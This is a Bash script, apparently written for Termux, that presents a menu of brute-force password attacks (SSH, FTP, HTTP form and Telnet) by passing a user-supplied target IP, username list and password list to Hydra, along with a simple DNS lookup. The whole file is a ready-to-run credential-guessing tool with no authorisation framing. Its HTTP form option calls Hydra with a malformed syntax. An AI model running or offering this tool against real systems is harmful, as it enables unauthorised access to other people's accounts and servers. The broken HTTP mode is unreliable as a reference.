#!/bin/bash

# A Better Password Cracking Script with More Options
# Written by: noob887
# This script aims to improve the performance and functionality over Hydra in Termux.

# Define color codes for output
NC='\033[0m'          # No color
RED='\033[0;31m'      # Red
GREEN='\033[0;32m'    # Green
YELLOW='\033[0;33m'   # Yellow
BLUE='\033[0;34m'     # Blue

# Display header
clear
echo -e "${BLUE}======================================="
echo -e "${BLUE}         Improved Hydra Cracker        "
echo -e "${BLUE}            Termux Version             "
echo -e "${BLUE}======================================="
echo -e "${GREEN}A simple script with advanced options.${NC}"

# Ask user for action
echo -e "${YELLOW}Choose an action:${NC}"
echo -e "1. SSH Bruteforce Attack"
echo -e "2. FTP Bruteforce Attack"
echo -e "3. HTTP Form Bruteforce Attack"
echo -e "4. Telnet Bruteforce Attack"
echo -e "5. DNS Lookup"
echo -e "6. Exit"
read -p "Enter your choice (1-6): " choice

# Define function for SSH Bruteforce
ssh_attack() {
  read -p "Enter the target IP address: " target_ip
  read -p "Enter the username list (absolute path): " user_list
  read -p "Enter the password list (absolute path): " pass_list
  read -p "Enter the SSH port (default 22): " port
  port=${port:-22}

  echo -e "${GREEN}Starting SSH Bruteforce Attack on ${target_ip}:${port}${NC}"
  hydra -L "$user_list" -P "$pass_list" "$target_ip" ssh -s "$port" -vV
}

# Define function for FTP Bruteforce
ftp_attack() {
  read -p "Enter the target IP address: " target_ip
  read -p "Enter the username list (absolute path): " user_list
  read -p "Enter the password list (absolute path): " pass_list
  read -p "Enter the FTP port (default 21): " port
  port=${port:-21}

  echo -e "${GREEN}Starting FTP Bruteforce Attack on ${target_ip}:${port}${NC}"
  hydra -L "$user_list" -P "$pass_list" "$target_ip" ftp -s "$port" -vV
}

# Define function for HTTP Form Bruteforce
http_attack() {
  read -p "Enter the target URL (with form action): " target_url
  read -p "Enter the username list (absolute path): " user_list
  read -p "Enter the password list (absolute path): " pass_list
  read -p "Enter the POST method (default: POST): " method
  method=${method:-POST}

  echo -e "${GREEN}Starting HTTP Form Bruteforce Attack on ${target_url}${NC}"
  hydra -L "$user_list" -P "$pass_list" "$target_url" "$method" -vV
}

# Define function for Telnet Bruteforce
telnet_attack() {
  read -p "Enter the target IP address: " target_ip
  read -p "Enter the username list (absolute path): " user_list
  read -p "Enter the password list (absolute path): " pass_list
  read -p "Enter the Telnet port (default 23): " port
  port=${port:-23}

  echo -e "${GREEN}Starting Telnet Bruteforce Attack on ${target_ip}:${port}${NC}"
  hydra -L "$user_list" -P "$pass_list" "$target_ip" telnet -s "$port" -vV
}

# Define function for DNS Lookup
dns_lookup() {
  read -p "Enter the domain to resolve: " domain
  echo -e "${GREEN}Performing DNS Lookup for $domain${NC}"
  dig +short "$domain"
}

# Main loop based on user's choice
case $choice in
  1)
    ssh_attack
    ;;
  2)
    ftp_attack
    ;;
  3)
    http_attack
    ;;
  4)
    telnet_attack
    ;;
  5)
    dns_lookup
    ;;
  6)
    echo -e "${YELLOW}Exiting...${NC}"
    exit 0
    ;;
  *)
    echo -e "${RED}Invalid choice! Please try again.${NC}"
    ;;
esac
